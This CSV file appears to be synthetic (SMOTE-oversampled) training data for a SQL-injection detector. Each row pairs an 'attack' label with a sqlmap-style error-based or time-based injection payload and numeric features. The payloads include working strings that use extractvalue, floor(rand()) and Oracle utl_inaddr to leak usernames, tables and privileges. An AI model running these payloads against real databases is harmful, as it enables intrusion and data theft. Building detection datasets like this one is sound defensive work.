id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000517,attack,error,"1'||  (  select 'epjr' from dual where 3074  =  3074 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000053,3.142079670371838,190.18921940917306,37.55676582275191,3.9925639701955773,66.74598523192496,31.481078059082698,69.40539029541347,22.556765822751913,0.350288402033423,0.16570878502666006,0.36552663637397187,0.11847617656594513,1.5567658227519134,0.0,0.962156118165391,0.0,1.1102230246251565e-16,1.0,0.0,13.481078059082696,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,3.0,0.5189219409173045,0.0,0.48107805908269563,0.5189219409173045,0.0,1.0,1.0,0.0,0.0,1.0,0.5189219409173045,0.5189219409173043,0.0,1.0,0.5189219409173045,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0378438818346085
SMOTE_000518,attack,error,"-2852%'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000151,0.45118835436920596,208.4058042427142,40.531398585761934,3.8804908562651335,63.0,37.0,84.4058042427142,24.0,0.30233912437252514,0.177564247647356,0.4049198186953474,0.11517680928477148,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.234300707119033,0.7656992928809663,-1.1102230246251565e-16,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000519,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000084,0.866755606477562,312.35887670999483,37.35887670999482,4.024279518655368,109.35887670999482,55.0,113.0,35.0,0.3501049804633504,0.1760799314015553,0.3617642226977409,0.11205086543735338,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.3588767099948185,0.6411232900051815,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000520,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000050,0.3690526139285403,310.86493762870856,37.90295171039584,4.061011732328179,111.6413239455418,55.0,110.61180684158337,33.61180684158337,0.35900218968315184,0.17700809624651176,0.35590052440772646,0.10808918966260997,3.611806841583372,0.0,0.0,0.0,2.0,1.0,0.0,20.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.0,0.9029517103958431,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,0.9029517103958431,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.902951710395843
SMOTE_000521,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.8022532748705169,213.9974756461989,42.0,4.291785125410804,116.88692550259915,2.0,71.0,24.11055014359976,0.5461053659194668,0.009350007653474435,0.3319252716983424,0.11261935472871636,3.0,0.0,0.0,0.0,1.1102230246251565e-16,3.0,0.0,10.0,2.7755575615628914e-17,4.665825215399636,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000522,attack,error,"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000156,0.5415382809118467,330.2572051004218,33.2572051004218,3.4889756061551274,80.0,52.0,142.0,56.2572051004218,0.24223586553113846,0.15745331259524,0.4299686613177708,0.17034216055585072,0.25720510042180145,0.0,1.0,0.0,1.1102230246251565e-16,2.0,0.0,30.0,2.7755575615628914e-17,-1.1102230246251565e-16,1.0,22.999999999999996,0.25720510042180167,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000523,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000041,0.47696941556818306,194.18200116216894,28.364002324337868,3.50348900382646,46.63599767566213,35.728004648675736,84.63599767566214,27.182001162168934,0.2401752443683985,0.1839773423517626,0.435868713991385,0.1399786992884539,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.182001162168933,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.1820011621689335,0.8179988378310666,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000524,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000099,2.2084683034502746,277.0,37.0,3.9278141410897223,99.0,35.0,105.0,38.0,0.3574007220216607,0.1263537906137184,0.37906137184115524,0.1371841155234657,1.8872510136708167,2.1127489863291835,0.0,0.0,2.0,2.0,0.0,20.0,2.0,2.0,5.0,4.0,0.4718127534177042,0.5281872465822959,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000525,attack,error,"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000040,0.9620047569939139,205.8189547057848,38.0,3.8316128479798515,63.0,37.0,83.3808679143498,22.43808679143498,0.30630821959860033,0.17989530357378114,0.4047652546002843,0.10903122222733422,0.5619132085650185,0.0,1.0,0.0,1.0,1.0,0.0,14.876173582869963,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.0,0.5619132085650187,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000526,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000049,1.298921330196073,274.30754086732117,36.0,4.016543081874055,108.61508173464233,35.0,97.30754086732117,33.384918265357676,0.39595644302085353,0.12759437385061392,0.35473702366975246,0.12171215945878015,3.077377398036517,0.0,0.0,0.0,2.0,1.692459132678839,0.0,18.307540867321162,2.7755575615628914e-17,2.0,5.0,3.692459132678839,1.0,0.0,0.0,0.3075408673211609,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.6924591326788392,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.692459132678838
SMOTE_000527,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000081,0.40248736452107015,234.65825463669148,32.67087268165427,3.9260077165447833,81.0,45.0,83.0,25.658254636691467,0.3451883488053743,0.19177130489187463,0.3537115179116799,0.1093288283910712,2.6582546366914652,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,14.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000528,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.20902059255072458,218.8916341483022,42.0,4.356012602906904,120.89163414830219,2.0,71.0,25.0,0.5522724095340947,0.009137297764610308,0.3243740706436661,0.11421622205762891,3.0,0.0,0.0,0.0,1.1102230246251565e-16,3.0,0.0,10.0,2.7755575615628914e-17,6.2972113827673954,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000529,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000016,1.3102582022883702,206.07182880406046,32.66906096013535,3.5860942509436864,56.01436576081209,32.99281711959395,89.71934112297767,27.345304800676743,0.272175849604239,0.16139361748562225,0.4339010924076392,0.1325294405024996,0.0,4.0,0.0,0.0,0.6690609601353487,1.0,0.0,16.676243840541396,2.7755575615628914e-17,-1.1102230246251565e-16,4.330939039864651,1.669060960135349,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.338121920270697,0.0,0.0,0.6690609601353485,1.3309390398646515,0.6690609601353485,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.007182880406045
SMOTE_000530,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swua' like 'swua",nearest_attack_euclidean,R000137,0.08761787297397995,194.95637325416993,28.91274650833988,3.538068526585157,50.694612779189576,35.17450698332024,83.0,26.08725349166012,0.26002311541050227,0.1804270631205789,0.4257367438515436,0.13381307761737524,4.0,0.0,0.0,0.0,1.1102230246251565e-16,1.043626745830061,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0436267458300605,1.0436267458300605,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000531,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000003,1.3311789371407374,238.82050703363055,43.1566948352017,4.413610637560057,136.19372769282376,2.0,74.47008450560509,26.156694835201698,0.5690921728129725,0.008422288989611004,0.3126530091532569,0.10983252904415962,3.0,0.0,0.0,0.0,1.1102230246251565e-16,3.578347417600849,0.0,10.0,2.7755575615628914e-17,6.578347417600849,1.0,3.578347417600849,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,2.0,0.0,1.578347417600849,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.578347417600849
SMOTE_000532,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000016,0.35947605141183375,217.5657139692309,32.85766236643355,3.5143602521794426,58.14233763356644,32.0,98.13870106853156,29.28467526713289,0.267293471990434,0.14712630839012503,0.4509929265742254,0.13458729304521555,0.0,4.0,0.0,0.0,1.0,1.0,0.0,18.28467526713289,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,2.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.1423376335664457,0.8576623664335543,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000533,attack,error,"1'+  (  select pdfv where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000155,1.4063557854647912,197.40511611112976,32.78655973180205,3.798630902968783,52.93279865901026,44.24704093869282,74.65215704982256,25.5731194636041,0.26775818607478247,0.22647934877153703,0.37625815323662004,0.1295043119170605,2.0,0.0,0.0,0.0,0.3932798659010258,2.0,0.0,13.573119463604105,2.7755575615628914e-17,-1.1102230246251565e-16,5.213440268197949,4.393279865901025,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.7865597318020514,0.0,1.0,0.3932798659010259,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.179839597703078
SMOTE_000534,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000112,1.2385978369356268,213.1320866292475,32.0,3.535004630948022,56.63230747328616,33.01472536859164,94.85274631408355,28.63230747328616,0.26656105076288084,0.15693514960291752,0.4424874311313054,0.13401636850289625,0.0,4.0,0.0,0.0,0.6617582104694517,1.0,0.0,17.97054926281671,2.7755575615628914e-17,-1.1102230246251565e-16,4.3382417895305485,1.6617582104694524,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.3235164209389034,0.0,0.0,0.6617582104694515,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.9852746314083545
SMOTE_000535,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R000042,1.3401164645624175,328.8818263014434,36.855533067297166,3.8201896104129403,101.28517768909906,60.71857848720756,131.58913625973116,35.28893386540567,0.30937318548706033,0.1846668917499807,0.3987587629635346,0.10720115979942439,0.0,0.0,0.0,0.0,2.0,1.7148223109009444,0.0,24.288933865405667,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.714822310900944,0.0,0.0,0.0,0.2851776890990555,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,0.7148223109009446,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.714822310900946
SMOTE_000536,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000135,0.5902673997738954,327.6113430194413,31.227073306038374,3.540356013402022,89.34060995905756,45.0,137.36243983623024,55.908293224153496,0.2727700151013566,0.13742254256520903,0.41923651897551556,0.1705709233579188,0.4541466120767479,0.0,0.0,0.0,1.1102230246251565e-16,2.113536653019187,0.0,29.11353665301919,0.22707330603837386,3.0,0.0,22.113536653019185,0.11353665301918686,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.113536653019187,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.113536653019187
SMOTE_000537,attack,error,"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",nearest_attack_euclidean,R000077,1.2780320462828816,330.78507143422235,38.704051020677255,3.920808765777954,107.33645918609531,55.0,129.44861224812706,39.0,0.3244002261949222,0.16641457641060145,0.39118213412150443,0.11800306327297194,0.0,4.0,0.0,0.0,2.0,2.0,0.0,23.40810204135451,0.5918979586454886,-1.1102230246251565e-16,6.0,5.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.7040510206772557,0.29594897932274433,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000538,attack,error,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejul'  =  'ejul",nearest_attack_euclidean,R000012,0.18547787356332293,346.58205753630745,39.05970606624179,3.848821699336542,110.23882426496716,55.47764852993432,139.98499687388957,40.88058786751642,0.3180949795808593,0.16010112625352008,0.403854244809462,0.1179496493561586,4.0,0.0,0.0,0.0,2.0,2.0,0.0,25.76117573503284,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.119412132483579,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.059706066241789,3.0,0.059706066241789646,1.0,1.9402939337582104,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.05970606624179
SMOTE_000539,attack,error,"1%'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000152,0.766623012665163,289.79846784212964,36.828352548875664,3.8519051377045623,100.544827060119,35.0,114.940230586508,39.31341019550266,0.3470850437796307,0.12078376682548597,0.39651016847133075,0.1356210209235527,4.0,0.0,0.0,0.0,2.0,2.0,0.0,21.65670509775133,1.6567050977513318,2.0,5.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.171647451124334,0.828352548875666,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000540,attack,error,"1"" where 9172  =  9172 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000120,0.0625945595902227,314.63044192466435,40.0,4.033755898299016,103.75251165753738,63.0,113.75251165753738,34.125418609589566,0.32973598689281225,0.2002712926433892,0.36152508096319147,0.10846763950060709,0.0,1.0,2.0,0.0,2.0,2.0,0.0,20.125418609589566,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
